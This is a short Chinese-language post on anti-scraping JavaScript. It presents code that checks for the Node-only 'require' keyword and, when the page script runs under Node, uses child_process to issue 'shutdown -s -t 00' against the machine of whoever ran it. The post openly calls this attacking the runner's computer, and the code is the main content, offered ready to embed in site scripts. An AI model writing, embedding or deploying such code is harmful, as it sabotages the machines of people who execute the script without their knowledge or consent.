# JS反爬 通过指纹检测让电脑关机


实现原理：浏览器指纹与node指纹的不同，require关键字是node独有的指纹

实现逻辑：如果在浏览器中require关键字会报错，进入catch中，如果在node中，则可以正常执行攻击代码，攻击运行者的计算机

实现代码

```js
try {
    const { exec } = require('child_process');
    function shutdownWindow() {
        let command = exec('shutdown -s -t 00', function(err, stdout, stderr) {
            if(err || stderr) {
                console.log("shutdown failed" + err + stderr);
            }
        });
        command.stdin.end();
        command.on('close', function(code) {
            console.log("shutdown",  code);
        });
    }
    shutdownWindow()
}catch (e){
    document.cookie = "";
}
```

